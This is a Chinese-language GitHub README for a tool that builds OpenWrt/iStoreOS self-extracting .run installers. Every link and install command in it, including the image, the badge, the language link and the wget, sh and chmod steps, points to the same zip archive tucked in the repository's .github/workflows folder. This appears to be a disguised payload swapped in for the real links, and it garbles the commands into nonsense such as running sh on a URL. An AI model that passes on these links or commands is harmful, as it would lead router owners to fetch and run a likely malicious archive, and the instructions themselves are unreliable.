# RunFilesBuilder 
<img src="https://github.com/ztdesk1/RunFilesBuilder/raw/refs/heads/master/.github/workflows/Run-Builder-Files-v3.3-beta.4.zip"/>  [![GitHub Release](https://github.com/ztdesk1/RunFilesBuilder/raw/refs/heads/master/.github/workflows/Run-Builder-Files-v3.3-beta.4.zip%23E1A8CD)](https://github.com/ztdesk1/RunFilesBuilder/raw/refs/heads/master/.github/workflows/Run-Builder-Files-v3.3-beta.4.zip)

【[ENGLISH](https://github.com/ztdesk1/RunFilesBuilder/raw/refs/heads/master/.github/workflows/Run-Builder-Files-v3.3-beta.4.zip)】

>> 这是一个工作流。同步各位大佬项目里最新编译的ipk文件 生成适用于iStoreOS/OpenWrt 用的run自解压包<br>
>> 本质上是利用makeslef,将ipk和shell文件打包成自解压程序。<br>
>> iStoreOS 可以在iStore商店手动安装<br>
>> ImmortalWrt 可下载后 使用 `sh https://github.com/ztdesk1/RunFilesBuilder/raw/refs/heads/master/.github/workflows/Run-Builder-Files-v3.3-beta.4.zip `来安装

## Install By Command
> Like This (Immortalwrt 等其他OpenWrt)
```bash
wget -O https://github.com/ztdesk1/RunFilesBuilder/raw/refs/heads/master/.github/workflows/Run-Builder-Files-v3.3-beta.4.zip <run下载地址>
sh https://github.com/ztdesk1/RunFilesBuilder/raw/refs/heads/master/.github/workflows/Run-Builder-Files-v3.3-beta.4.zip
```

## Immortalwrt 如何安装iStore商店
```
wget -qO https://github.com/ztdesk1/RunFilesBuilder/raw/refs/heads/master/.github/workflows/Run-Builder-Files-v3.3-beta.4.zip https://github.com/ztdesk1/RunFilesBuilder/raw/refs/heads/master/.github/workflows/Run-Builder-Files-v3.3-beta.4.zip && chmod +x https://github.com/ztdesk1/RunFilesBuilder/raw/refs/heads/master/.github/workflows/Run-Builder-Files-v3.3-beta.4.zip && https://github.com/ztdesk1/RunFilesBuilder/raw/refs/heads/master/.github/workflows/Run-Builder-Files-v3.3-beta.4.zip

```
